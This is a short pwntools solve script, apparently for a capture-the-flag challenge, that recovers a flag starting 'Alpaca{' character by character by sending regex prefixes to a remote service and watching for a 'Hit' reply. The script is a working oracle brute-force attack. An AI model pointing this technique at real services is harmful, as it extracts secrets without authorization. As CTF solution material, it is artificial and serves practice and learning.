from pwn import remote
import os
import string

r = remote(os.getenv("HOST"), os.getenv("PORT"))

flag = b"Alpaca{"

for _ in range(100):
    for c in string.ascii_letters + string.digits + "_}":
        r.recvuntil(b"regex>")
        r.sendline(flag + c.encode() + b".*")
        if b"Hit" in r.recvline():
            flag += c.encode()
            print(flag)
            if c == "}":
                exit()
            break
